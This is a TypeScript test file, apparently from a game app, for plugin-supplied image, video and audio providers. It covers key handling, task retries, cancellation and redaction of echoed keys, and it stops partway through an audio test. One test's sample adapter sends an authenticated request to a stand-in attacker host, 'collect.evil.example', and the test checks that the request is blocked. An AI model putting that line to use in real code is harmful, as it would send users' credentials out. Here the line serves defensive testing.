import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { ImageModel, VideoModel } from "../src/shared/contracts.js";
import { GenerationShutdown, inspectMediaTaskJournal, mediaTaskJournal } from "../src/daemon/media-task-journal.js";
import type { PluginIndexEntry } from "../src/daemon/plugin-index.js";
import { PluginMediaModelChoices } from "../src/daemon/plugin-media-models.js";
import { PluginMediaProviders } from "../src/daemon/plugin-media-providers.js";
import type { PluginServices } from "../src/daemon/plugin-services.js";
import { ProviderImages } from "../src/daemon/provider-images.js";
import { ProviderVideos } from "../src/daemon/provider-videos.js";
import { ProviderAudio } from "../src/daemon/audio-generation.js";
import { ProviderModels3D } from "../src/daemon/provider-models3d.js";

const PNG = Buffer.concat([Buffer.from("89504e470d0a1a0a", "hex"), Buffer.alloc(16)]);
const MP4 = Buffer.concat([Buffer.from("00000018", "hex"), Buffer.from("ftypisom"), Buffer.alloc(16)]);

let root: string;
beforeEach(async () => { root = await mkdtemp(path.join(tmpdir(), "ohmygame-media-")); });
afterEach(async () => { await rm(root, { recursive: true, force: true }); });

type Media = NonNullable<NonNullable<NonNullable<PluginIndexEntry["manifest"]["contributes"]>["providers"]>[number]["media"]>;

type Reply = (url: string) => Response | undefined;

async function setup(adapter: string, options: { key?: string | undefined; media?: Partial<Media>; network?: string[]; allowed?: boolean; reply?: Reply; choices?: PluginMediaModelChoices } = {}) {
  await writeFile(path.join(root, "media.js"), adapter);
  const entry = {
    id: "acme/flow", version: "1.0.0", root, digest: "d1", strings: { en: { provider: "Flow" } }, skills: [], toolSchemas: {},
    manifest: {
      id: "acme/flow", version: "1.0.0", displayName: "Flow", description: "Flow",
      configuration: { apiKey: { type: "secret", title: "Key" } },
      capabilities: { network: options.network ?? ["api.flow.example", "cdn.flow.example"] },
      contributes: { providers: [{
        id: "flow", title: "%provider%", apiKey: "apiKey",
        media: { adapter: "./media.js", image: { models: [{ id: "kolors", title: "Kolors", resolutions: ["1K"], aspectRatios: ["1:1", "16:9"], maxReferenceImages: 1 }] }, ...options.media },
      }] },
    },
  } as unknown as PluginIndexEntry;
  const key = "key" in options ? options.key : "sk-test";
  // Only plugins whose capabilities the person allowed are in `everyProject`.
  const services = { everyProject: async () => options.allowed === false ? [] : [entry], values: { secret: () => key } } as unknown as PluginServices;
  const requests: Array<{ url: string; method: string; headers: Record<string, string>; body?: string }> = [];
  const fetcher = (async (input: string | URL | Request, init?: RequestInit) => {
    const url = String(input);
    requests.push({ url, method: init?.method ?? "GET", headers: Object.fromEntries(new Headers(init?.headers).entries()), ...(typeof init?.body === "string" ? { body: init.body } : {}) });
    const reply = options.reply?.(url);
    if (reply) return reply;
    if (url.startsWith("https://cdn.flow.example/") && url.endsWith(".mp4")) return new Response(MP4, { headers: { "content-type": "video/mp4" } });
    if (url.startsWith("https://cdn.flow.example/")) return new Response(PNG, { headers: { "content-type": "image/png" } });
    return new Response(JSON.stringify({ url: "https://cdn.flow.example/one.png", id: "t1" }), { headers: { "content-type": "application/json" } });
  }) as typeof fetch;
  return { media: new PluginMediaProviders(services, fetcher, undefined, options.choices), requests };
}

const firstModel = async (media: PluginMediaProviders): Promise<ImageModel> => (await media.imageProviders())[0]!.models[0]!;

const IMAGE_START = `export default { image: { async start(input, host) {
  const answer = await (await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true, json: { model: input.model, prompt: input.prompt, ratio: input.aspectRatio, refs: input.references.length } })).json();
  return { outputs: [{ url: answer.url }] };
} } };`;

describe("plugin media providers", () => {
  it("lists a provider's image models once its key is set", async () => {
    const { media } = await setup(IMAGE_START);
    expect(await media.imageProviders()).toEqual([{ id: "plugin.acme.flow.flow", name: "Flow", models: [expect.objectContaining({
      provider: "plugin.acme.flow.flow", providerName: "Flow", id: "kolors", name: "Kolors", protocol: "plugin", sizes: [],
      generationOptions: [{ resolution: "1K", aspectRatio: "1:1" }, { resolution: "1K", aspectRatio: "16:9" }],
      supportsReferenceImage: true, maxReferenceImages: 1, maxOutputs: 1,
    })] }]);
    expect(await (await setup(IMAGE_START, { key: undefined })).media.imageProviders()).toEqual([]);
  });

  it("makes a picture through the adapter, adding the key where it asks, and downloads the result", async () => {
    const { media, requests } = await setup(IMAGE_START);
    const model = await firstModel(media);
    const image = await media.generateImage(model, { prompt: "a fox", aspectRatio: "16:9", images: [{ mediaType: "image/png", data: PNG.toString("base64") }] });
    expect(image).toEqual({ bytes: PNG, mediaType: "image/png" });
    expect(requests[0]).toMatchObject({ url: "https://api.flow.example/v1/images", method: "POST", headers: { authorization: "Bearer sk-test", "content-type": "application/json" } });
    expect(JSON.parse(requests[0]!.body!)).toEqual({ model: "kolors", prompt: "a fox", ratio: "16:9", refs: 1 });
    // The result is fetched without the key.
    expect(requests[1]).toMatchObject({ url: "https://cdn.flow.example/one.png", method: "GET" });
    expect(requests[1]!.headers.authorization).toBeUndefined();
  });

  it("puts the key in the query when the manifest says so", async () => {
    const { media, requests } = await setup(IMAGE_START, { media: { auth: { query: "key" } } });
    const model = await firstModel(media);
    await media.generateImage(model, { prompt: "a fox" });
    expect(requests[0]!.url).toBe("https://api.flow.example/v1/images?key=sk-test");
    expect(requests[0]!.headers.authorization).toBeUndefined();
  });

  it("checks a task at the adapter's pace until it has the result", async () => {
    const { media, requests } = await setup(`export default { image: {
      async start(input, host) { return { task: { id: "t1", checks: 0 }, retryAfter: 0.01 }; },
      async check(task, host) {
        await host.fetch("https://api.flow.example/v1/tasks/" + task.id, { auth: true });
        return task.checks < 1 ? { task: { ...task, checks: task.checks + 1 }, retryAfter: 1 } : { outputs: [{ base64: "${PNG.toString("base64")}" }] };
      },
    } };`);
    const model = await firstModel(media);
    const started = Date.now();
    expect((await media.generateImage(model, { prompt: "a fox" })).bytes).toEqual(PNG);
    // retryAfter is kept to at least a second.
    expect(Date.now() - started).toBeGreaterThanOrEqual(1900);
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1", "https://api.flow.example/v1/tasks/t1"]);
  }, 10_000);

  it("shows the vendor's error, and refuses hosts and results the plugin wasn't allowed", async () => {
    const failing = await setup(`export default { image: { start: () => ({ error: "Not enough credit" }) } };`);
    const model = await firstModel(failing.media);
    await expect(failing.media.generateImage(model, { prompt: "x" })).rejects.toThrow("Flow: Not enough credit");
    const elsewhere = await setup(`export default { image: { async start(input, host) { await host.fetch("https://collect.evil.example/", { auth: true }); return { outputs: [] }; } } };`);
    await expect(elsewhere.media.generateImage(model, { prompt: "x" })).rejects.toThrow("collect.evil.example isn't in the plugin's capabilities.network");
    expect(elsewhere.requests).toEqual([]);
    const result = await setup(`export default { image: { start: () => ({ outputs: [{ url: "https://other.example/x.png" }] }) } };`);
    await expect(result.media.generateImage(model, { prompt: "x" })).rejects.toThrow("other.example isn't in the plugin's capabilities.network");
    const notPicture = await setup(`export default { image: { start: () => ({ outputs: [{ base64: "aGVsbG8=" }] }) } };`);
    await expect(notPicture.media.generateImage(model, { prompt: "x" })).rejects.toThrow("isn't a PNG, JPEG or WebP picture");
  });

  it("leaves out a plugin whose hosts the person hasn't allowed", async () => {
    expect(await (await setup(IMAGE_START, { allowed: false })).media.imageProviders()).toEqual([]);
  });

  it("never shows the adapter the key, even where the vendor echoes it", async () => {
    const { media } = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: response.headers.location + " " + (await response.text()) };
    } } };`, {
      key: "sk/te st",
      media: { auth: { query: "key" } },
      reply: (url) => url.startsWith("https://api.flow.example/") ? new Response(`echo ${new URL(url).searchParams.get("key")} ${JSON.stringify(new URL(url).searchParams.get("key")).replaceAll("/", "\\/")}`, { status: 302, headers: { location: url } }) : undefined,
    });
    const error = await media.generateImage(await firstModel(media), { prompt: "x" }).catch((cause: Error) => cause.message);
    expect(error).toBe('Flow: https://api.flow.example/v1/images?key=[key] echo [key] "[key]"');

    // JSON may spell it with escapes, which json() would undo.
    const escaped = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: (await response.json()).token };
    } } };`, { reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"token":"\\u0073k-test"}') : undefined });
    expect(await escaped.media.generateImage(await firstModel(escaped.media), { prompt: "x" }).catch((cause: Error) => cause.message)).toBe("Flow: [key]");
    const encoded = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: (await response.json()).token };
    } } };`, { key: "sk/te st", reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"token":"\\u0073k%2Fte%20st"}') : undefined });
    expect(await encoded.media.generateImage(await firstModel(encoded.media), { prompt: "x" }).catch((cause: Error) => cause.message)).toBe("Flow: [key]");
    const numeric = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: await response.text() };
    } } };`, { key: "12345", reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"id":12345,"token":"\\u0031\\u0032\\u0033\\u0034\\u0035"}') : undefined });
    expect(await numeric.media.generateImage(await firstModel(numeric.media), { prompt: "x" }).catch((cause: Error) => cause.message)).toBe('Flow: {"id":[key],"token":"[key]"}');
    // Nor through text(), whatever json() would keep of the body.
    const twice = await setup(`export default { image: { async start(input, host) {
      const response = await host.fetch("https://api.flow.example/v1/images", { method: "POST", auth: true });
      return { error: await response.text() };
    } } };`, { reply: (url) => url.startsWith("https://api.flow.example/") ? new Response('{"token":"\\u0073k-test","token":"safe"}') : undefined });
    expect(await twice.media.generateImage(await firstModel(twice.media), { prompt: "x" }).catch((cause: Error) => cause.message)).not.toContain("sk-test");
  });

  it("tells the vendor to stop a task when checking it fails", async () => {
    const { media, requests } = await setup(`export default { image: {
      start: () => ({ task: { id: "t1" }, retryAfter: 1 }),
      check() { throw new Error("adapter broke"); },
      async cancel(task, host) { await host.fetch("https://api.flow.example/v1/tasks/" + task.id + "/cancel", { method: "POST", auth: true }); return null; },
    } };`);
    await expect(media.generateImage(await firstModel(media), { prompt: "x" })).rejects.toThrow("adapter broke");
    await expect.poll(() => requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1/cancel"]);
  });

  it("tells the vendor to stop a task when the person stops waiting", async () => {
    const { media, requests } = await setup(`export default { image: {
      start: () => ({ task: { id: "t1" }, retryAfter: 5 }),
      check: () => ({ error: "never checked" }),
      async cancel(task, host) { await host.fetch("https://api.flow.example/v1/tasks/" + task.id + "/cancel", { method: "POST", auth: true }); return null; },
    } };`);
    const controller = new AbortController();
    const pending = media.generateImage(await firstModel(media), { prompt: "x" }, controller.signal);
    setTimeout(() => controller.abort(new Error("stopped by the person")), 100);
    await expect(pending).rejects.toThrow("stopped by the person");
    await expect.poll(() => requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/tasks/t1/cancel"]);
  });

  it("joins the image catalog and takes requests for its models", async () => {
    const { media, requests } = await setup(IMAGE_START);
    const images = new ProviderImages(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => true, { pluginImages: media });
    const catalog = await images.catalog();
    expect(catalog.models.map((model) => `${model.provider}/${model.id}`)).toEqual(["plugin.acme.flow.flow/kolors"]);
    expect(catalog.providers).toEqual([{ provider: "plugin.acme.flow.flow", providerName: "Flow", state: "ready" }]);
    // A legacy size becomes the model's nearest resolution and aspect ratio.
    const image = await images.generate({ prompt: "a fox", imageModel: { provider: "plugin.acme.flow.flow", id: "kolors" }, size: "1024x1024" });
    expect(image.mediaType).toBe("image/png");
    expect(JSON.parse(requests[0]!.body!)).toMatchObject({ ratio: "1:1" });
    await expect(images.generate({ prompt: "a fox", imageModel: { provider: "plugin.acme.flow.flow", id: "kolors" }, resolution: "4K", aspectRatio: "1:1" }))
      .rejects.toThrow("not supported by the selected model");
    // Off in Settings, it leaves the catalog.
    const off = new ProviderImages(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => false, { pluginImages: media });
    expect((await off.catalog()).models).toEqual([]);
  });
});

const VIDEO_MEDIA = { video: { models: [{ id: "wan", title: "Wan", durations: [5], resolutions: ["720p"], aspectRatios: ["16:9"], maxReferenceImages: 2 }] } } as unknown as Partial<Media>;

// Starts a task, checks it once, then has the result.
const VIDEO_TASK = `export default { video: {
  async start(input, host) {
    const answer = await (await host.fetch("https://api.flow.example/v1/videos", { method: "POST", auth: true, json: { model: input.model, seconds: input.duration, frames: input.references.length, mode: input.referenceMode } })).json();
    return { task: { id: answer.id, checks: 0 }, retryAfter: 0 };
  },
  async check(task, host) {
    await host.fetch("https://api.flow.example/v1/videos/" + task.id, { auth: true });
    return task.checks < 1 ? { task: { ...task, checks: task.checks + 1 }, retryAfter: 0 } : { outputs: [{ url: "https://cdn.flow.example/" + task.id + ".mp4" }] };
  },
  async cancel(task, host) { await host.fetch("https://api.flow.example/v1/videos/" + task.id + "/cancel", { method: "POST", auth: true }); return null; },
} };`;

const firstVideo = async (media: PluginMediaProviders): Promise<VideoModel> => (await media.videoProviders())[0]!.models[0]!;
const journalAt = (id = "job-1") => mediaTaskJournal(path.join(root, "media-tasks"), id);

describe("plugin media providers: video", () => {
  it("uses the same ratios as the picker for text, frames and reference images", async () => {
    const adapter = `export default { video: { async start(input, host) {
      await host.fetch("https://api.flow.example/v1/videos", { method: "POST", auth: true, json: { ratio: input.aspectRatio, mode: input.referenceMode, count: input.references.length } });
      return { outputs: [{ url: "https://cdn.flow.example/result.mp4" }] };
    } } };`;
    const { media, requests } = await setup(adapter, { media: { video: { models: [{
      id: "ratios", durations: [5], resolutions: ["720p"], aspectRatios: ["16:9", "9:16"],
      maxReferenceImages: 30, referenceModes: ["frame", "reference"],
      imageAspectRatios: ["adaptive", "16:9"], frameAspectRatios: ["adaptive"],
    }] } } as unknown as Partial<Media> });
    const model = await firstVideo(media);
    expect(model).toMatchObject({ imageAspectRatios: ["adaptive", "16:9"], frameAspectRatios: ["adaptive"] });
    const file = path.join(root, "first.png");
    await writeFile(file, PNG);
    const references = [{ type: "image" as const, name: "first.png", mediaType: "image/png", absolutePath: file }];
    await media.generateVideo(model, { prompt: "text" });
    await media.generateVideo(model, { prompt: "frame", references });
    await media.generateVideo(model, { prompt: "reference", references: Array(30).fill(references[0]), referenceMode: "reference", aspectRatio: "16:9" });
    expect(requests.filter((request) => request.method === "POST").map((request) => JSON.parse(request.body!)))
      .toEqual([{ ratio: "16:9", count: 0 }, { ratio: "adaptive", mode: "frame", count: 1 }, { ratio: "16:9", mode: "reference", count: 30 }]);
    const count = requests.length;
    await expect(media.generateVideo(model, { prompt: "reference", references: Array(31).fill(references[0]), referenceMode: "reference" })).rejects.toThrow("up to 30 reference images");
    await expect(media.generateVideo(model, { prompt: "frame", references: Array(3).fill(references[0]), referenceMode: "frame" })).rejects.toThrow("up to 2 reference images");
    await expect(media.generateVideo(model, { prompt: "text", aspectRatio: "adaptive" })).rejects.toThrow("aspect ratio is not supported");
    await expect(media.generateVideo(model, { prompt: "frame", references, aspectRatio: "16:9" })).rejects.toThrow("aspect ratio is not supported");
    await expect(media.generateVideo(model, { prompt: "reference", references, referenceMode: "reference", aspectRatio: "9:16" })).rejects.toThrow("aspect ratio is not supported");
    expect(requests).toHaveLength(count);
  });

  it("preserves discovered reference ratios across model selection and restart", async () => {
    const model = { id: "discovered", durations: [5], resolutions: ["720p"], aspectRatios: ["16:9"], maxReferenceImages: 30,
      referenceModes: ["frame", "reference"], imageAspectRatios: ["adaptive", "16:9"], frameAspectRatios: ["adaptive"] };
    const adapter = `export default { video: { models: () => ({ models: ${JSON.stringify([model, { ...model, id: "invalid", frameAspectRatios: [] }, { ...model, id: "too-many", maxReferenceImages: 31 }])} }) } };`;
    const mediaSection: Partial<Media> = { video: { discoverModels: true, models: [] } };
    const { media } = await setup(adapter, { media: mediaSection, choices: new PluginMediaModelChoices(root) });
    const provider = "plugin.acme.flow.flow";
    expect(await media.listModels(provider, "video", true)).toMatchObject({ skipped: 2, models: [{ id: "discovered", shown: false }] });
    await media.setModelsShown(provider, "video", ["discovered"], true);
    const again = await setup(adapter, { media: mediaSection, choices: new PluginMediaModelChoices(root) });
    expect(await firstVideo(again.media)).toMatchObject({ maxImageReferences: 30, imageAspectRatios: model.imageAspectRatios, frameAspectRatios: model.frameAspectRatios });
  });

  it("lists a provider's video models and makes one through a task", async () => {
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const model = await firstVideo(media);
    expect(model).toEqual({ provider: "plugin.acme.flow.flow", providerName: "Flow", id: "wan", name: "Wan", durations: [5], resolutions: ["720p"], aspectRatios: ["16:9"],
      maxImageReferences: 2, imageReferenceMode: "frame", referenceModes: ["frame"] });
    await writeFile(path.join(root, "first.png"), PNG);
    const video = await media.generateVideo(model, { prompt: "a fox runs", duration: 5, references: [{ type: "image", name: "first.png", mediaType: "image/png", absolutePath: path.join(root, "first.png") }] }, undefined, await journalAt());
    expect(video).toEqual({ bytes: MP4, mediaType: "video/mp4" });
    expect(JSON.parse(requests[0]!.body!)).toEqual({ model: "wan", seconds: 5, frames: 1, mode: "frame" });
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos", "https://api.flow.example/v1/videos/t1", "https://api.flow.example/v1/videos/t1", "https://cdn.flow.example/t1.mp4"]);
    // The task stays until the caller stores the video: a retry checks it again, for a fresh address, without paying.
    const again = await media.generateVideo(model, { prompt: "a fox runs", duration: 5, references: [{ type: "image", name: "first.png", mediaType: "image/png", absolutePath: path.join(root, "first.png") }] }, undefined, await journalAt());
    expect(again.bytes).toEqual(MP4);
    expect(requests.map((request) => request.url).slice(4).filter((url) => url === "https://api.flow.example/v1/videos")).toEqual([]);
    await (await journalAt()).clear();
    expect((await journalAt().then((journal) => journal.begin({}))).state).toBe("new");
    await expect(media.generateVideo(model, { prompt: "x", duration: 10 })).rejects.toThrow("duration is not supported");
  }, 15_000);

  it("keeps the task when the app shuts down, and a retry checks it instead of starting again", async () => {
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const model = await firstVideo(media);
    const controller = new AbortController();
    const first = media.generateVideo(model, { prompt: "a fox" }, controller.signal, await journalAt());
    await expect.poll(() => requests.length).toBe(1);
    controller.abort(new GenerationShutdown());
    await expect(first).rejects.toBeInstanceOf(GenerationShutdown);
    // The vendor isn't told to stop: the task is resumed.
    await new Promise((resolve) => setTimeout(resolve, 50));
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos"]);
    const storedTask = await readFile(path.join(root, "media-tasks/job-1.json"), "utf8");
    expect(await inspectMediaTaskJournal(path.join(root, "media-tasks"), "job-1")).toBe("task-recorded");
    expect(await readFile(path.join(root, "media-tasks/job-1.json"), "utf8")).toBe(storedTask);
    const video = await media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt());
    expect(video.bytes).toEqual(MP4);
    expect(requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos", "https://api.flow.example/v1/videos/t1", "https://api.flow.example/v1/videos/t1", "https://cdn.flow.example/t1.mp4"]);
    // A different request under the same id isn't mixed up with it.
    const changed = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const journal = await journalAt("job-2");
    await journal.begin({ plugin: "acme/flow", provider: "flow", kind: "video", input: { other: true } });
    await journal.save({ id: "t9" });
    journal.release();
    await expect(changed.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-2"))).rejects.toThrow("changed since this video started");
  }, 15_000);

  it("never starts again when a start's answer was lost", async () => {
    let fail = true;
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, reply: (url) => {
      if (fail && url === "https://api.flow.example/v1/videos") throw new TypeError("socket hang up");
      return undefined;
    } });
    const model = await firstVideo(media);
    await expect(media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt())).rejects.toThrow("api.flow.example could not be reached");
    fail = false;
    expect(await inspectMediaTaskJournal(path.join(root, "media-tasks"), "job-1")).toBe("unconfirmed");
    await expect(media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt())).rejects.toThrow("its answer was lost");
    expect(requests).toHaveLength(1);
    // A start the adapter refused before sending anything can be tried again.
    const refused = await setup(`export default { video: { start: () => { throw new Error("bad input"); } } };`, { media: VIDEO_MEDIA });
    await expect(refused.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-3"))).rejects.toThrow("bad input");
    await expect(refused.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-3"))).rejects.toThrow("bad input");
  });

  it("keeps a task whose start may have gone through, or whose result couldn't be fetched", async () => {
    // The vendor took the start, but the adapter couldn't read its answer: a retry doesn't pay again.
    const misread = await setup(`export default { video: { async start(input, host) {
      await host.fetch("https://api.flow.example/v1/videos", { method: "POST", auth: true });
      throw new Error("unexpected answer");
    } } };`, { media: VIDEO_MEDIA });
    const model = await firstVideo(misread.media);
    await expect(misread.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-4"))).rejects.toThrow("unexpected answer");
    await expect(misread.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-4"))).rejects.toThrow("its answer was lost");
    // A read that fails before anything was sent leaves nothing to fear.
    const lookup = await setup(`export default { video: { async start(input, host) {
      await host.fetch("https://api.flow.example/v1/quota");
      return { error: "unreachable" };
    } } };`, { media: VIDEO_MEDIA, reply: (url) => { if (url.endsWith("/quota")) throw new TypeError("socket hang up"); return undefined; } });
    await expect(lookup.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-5"))).rejects.toThrow("could not be reached");
    await expect(lookup.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-5"))).rejects.toThrow("could not be reached");
    // Done, but the download failed: a retry checks the task again instead of starting one.
    let down = true;
    const { media, requests } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, reply: (url) => down && url.endsWith(".mp4") ? new Response("busy", { status: 503 }) : undefined });
    await expect(media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-6"))).rejects.toThrow("answered 503");
    down = false;
    expect((await media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-6"))).bytes).toEqual(MP4);
    expect(requests.filter((request) => request.url === "https://api.flow.example/v1/videos")).toHaveLength(1);
    // A vendor that answered at once, with a download that failed: a retry fetches the same result, not a new one.
    let gone = true;
    const direct = await setup(`export default { video: { async start(input, host) {
      await host.fetch("https://api.flow.example/v1/videos", { method: "POST", auth: true });
      return { outputs: [{ url: "https://cdn.flow.example/now.mp4" }] };
    } } };`, { media: VIDEO_MEDIA, reply: (url) => gone && url.endsWith(".mp4") ? new Response("busy", { status: 503 }) : undefined });
    await expect(direct.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-9"))).rejects.toThrow("answered 503");
    gone = false;
    expect((await direct.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-9"))).bytes).toEqual(MP4);
    expect(direct.requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos", "https://cdn.flow.example/now.mp4", "https://cdn.flow.example/now.mp4"]);
    // A check that failed once (a network blip) is tried again: the task goes on, not cancelled.
    let blips = 0;
    const flaky = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, reply: (url) => {
      if (url === "https://api.flow.example/v1/videos/t1" && blips++ === 0) throw new TypeError("socket hang up");
      return undefined;
    } });
    expect((await flaky.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-8"))).bytes).toEqual(MP4);
    expect(flaky.requests.map((request) => request.url).filter((url) => url === "https://api.flow.example/v1/videos" || url.endsWith("/cancel"))).toEqual(["https://api.flow.example/v1/videos"]);
  }, 20_000);

  it("won't check a task with another account's key", async () => {
    const first = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, key: "sk-one" });
    const model = await firstVideo(first.media);
    const controller = new AbortController();
    const pending = first.media.generateVideo(model, { prompt: "a fox" }, controller.signal, await journalAt("job-7"));
    await expect.poll(() => first.requests.length).toBe(1);
    controller.abort(new GenerationShutdown());
    await expect(pending).rejects.toBeInstanceOf(GenerationShutdown);
    const other = await setup(VIDEO_TASK, { media: VIDEO_MEDIA, key: "sk-two" });
    await expect(other.media.generateVideo(model, { prompt: "a fox" }, undefined, await journalAt("job-7"))).rejects.toThrow("its key or the request changed");
    expect(other.requests).toEqual([]);
  });

  it("tells the vendor to stop when the person stops, and starts afresh on retry", async () => {
    const { media, requests } = await setup(VIDEO_TASK.replaceAll("retryAfter: 0", "retryAfter: 30"), { media: VIDEO_MEDIA });
    const model = await firstVideo(media);
    const controller = new AbortController();
    const first = media.generateVideo(model, { prompt: "a fox" }, controller.signal, await journalAt());
    await expect.poll(() => requests.length).toBe(1);
    controller.abort(new Error("stopped by the person"));
    await expect(first).rejects.toThrow("stopped by the person");
    await expect.poll(() => requests.map((request) => request.url)).toEqual(["https://api.flow.example/v1/videos", "https://api.flow.example/v1/videos/t1/cancel"]);
    expect((await journalAt().then((journal) => journal.begin({}))).state).toBe("new");
  });

  it("joins the video catalog and takes requests for its models", async () => {
    const { media } = await setup(VIDEO_TASK, { media: VIDEO_MEDIA });
    const videos = new ProviderVideos(async () => { throw new Error("no runtime"); }, fetch, () => undefined, () => true, { pluginVideos: media });
    const catalog = await videos.catalog();
    expect(catalog.models.map((model) => `${model.provider}/${model.id}`)).toEqual(["plugin.acme.flow.flow/wan"]);
    expect(catalog.providers).toEqual([{ provider: "plugin.acme.flow.flow", providerName: "Flow", state: "ready" }]);
    const video = await videos.generate({ prompt: "a fox", model: { provider: "plugin.acme.flow.flow", id: "wan" }, duration: 5, resolution: "720p", aspectRatio: "16:9" });
    expect(video.mediaType).toBe("video/mp4");
    await expect(videos.generate({ prompt: "a fox", model: { provider: "plugin.acme.flow.flow", id: "nope" } })).rejects.toThrow("not available");
  }, 15_000);
});

/** A tenth of a second of silence: 16-bit mono PCM at 8 kHz. */
function wav(): Buffer {
  const samples = Buffer.alloc(1600);
  const header = Buffer.alloc(44);
  header.write("RIFF", 0, "ascii"); header.writeUInt32LE(36 + samples.length, 4); header.write("WAVE", 8, "ascii");
  header.write("fmt ", 12, "ascii"); header.writeUInt32LE(16, 16); header.writeUInt16LE(1, 20); header.writeUInt16LE(1, 22);
  header.writeUInt32LE(8000, 24); header.writeUInt32LE(16000, 28); header.writeUInt16LE(2, 32); header.writeUInt16LE(16, 34);
  header.write("data", 36, "ascii"); header.writeUInt32LE(samples.length, 40);
  return Buffer.concat([header, samples]);
}
const WAV = wav();
const GLB = (() => { const glb = Buffer.alloc(20); glb.write("glTF", 0, "ascii"); glb.writeUInt32LE(2, 4); glb.writeUInt32LE(20, 8); return glb; })();

const AUDIO_MEDIA = { audio: { models: [
  { id: "voice", title: "Voice", kinds: ["speech"], readsText: true, voices: [{ id: "amy", name: "Amy" }, { id: "bo", name: "Bo" }], formats: ["wav"], maxTextCharacters: 100 },
  { id: "foley", title: "Foley", kinds: ["sound-effect", "music"], formats: ["wav"], minDurationSeconds: 1, maxDurationSeconds: 10, loop: true },
] } } as unknown as Partial<Media>;

// Answers at once with the file, saying what it was asked for in the address.
const AUDIO_START = `export default { audio: { async start(input, host) {
  await host.fetch("https://api.flow.example/v1/audio", { method: "POST", auth: true, json: input });
  return { outputs: [{ url: "https://cdn.flow.example/" + input.model + ".wav" }] };
} } };`;

describe("plugin media providers: audio", () => {
  it("lists a provider's audio models and voices, and makes speech in its first voice", async () => {
    const { media, requests } = await setup(AUDIO_START, { media: AUDIO_MEDIA, reply: (url) => url.endsWith(".wav") ? new Response(new Uint8Array(WAV)) : undefined });
    const [provider] = await media.audioProviders();
    expect(provider!.voices).toEqual([{ id: "amy", name: "Amy" }, { id: "bo", name: "Bo" }]);
    const [voice, foley] = provider!.models;
    expect(voice).toEqual({ provider: "plugin.acme.flow.flow", providerName: "Flow", id: "voice", name: "Voice", protocol: "plugin",
      capabilities: { produces: ["speech"], readsText: true, supportsSpeaker: true, formats: ["wav"], maxTextCharacters: 100 } });
    const speech = await media.generateAudio(voice!, { prompt: "Hello there" });
    expect(speech).toMatchObject({ bytes: WAV, mediaType: "audio/wav", model: { provider: "plugin.acme.flow.flow", id: "voice" }, metadata: { durationMs: 100, sampleRate: 8000, channels: 1 } });
    expect(JSON.parse(requests[0]!.body!)).toEqual({ model: "voice", kind: "speech", prompt: "Hello there", format: "wav", voiceId: "amy" });
    await media.generateAudio(voice!, { prompt: "Faster", voiceId: "bo", speed: 50 });
    expect(JSON.parse(requests[2]!.body!)).toMatchObject({ voiceId: "bo", speed: 50 });
    // A model that makes more than one kind hears which; a loop goes only where the model takes one.
    await media.generateAudio(foley!, { prompt: "rain", kind: "music", durationSeconds: 5, loop: true });
    expect(JSON.parse(requests[4]!.body!)).toEqual({ model: "foley", kind: "music", prompt: "rain", format: "wav", durationSeconds: 5, loop: true });
    await expect(media.generateAudio(voice!, { prompt: "x".repeat(101) })).rejects.toThrow("up to 100 characters");
    await expect(media.generateAudio(voice!, { prompt: "Hi", voiceId: "zed" })).rejects.toThrow("isn't one this model speaks in");
    await expect(media.generateAudio(foley!, { prompt: "rain", durationSeconds: 20 })).rejects.toThrow("1 to 10 seconds");
    await expect(media.generateAudio(voice!, { prompt: "Hi", output: { format: "mp3" } })).rejects.toThrow("doesn't make mp3");
  }, 15_000);

  it("keeps a paid result whose download failed, so a retry fetches it without starting again", async () => {
    let downloads = 0;
    const { media, requests } = await setup(AUDIO_START, { media: AUDIO_MEDIA, reply: (url) => url.endsWith(".wav") ? (++downloads === 1 ? new Response("busy", { status: 503 }) : new Response(new Uint8Array(WAV))) : undefined });
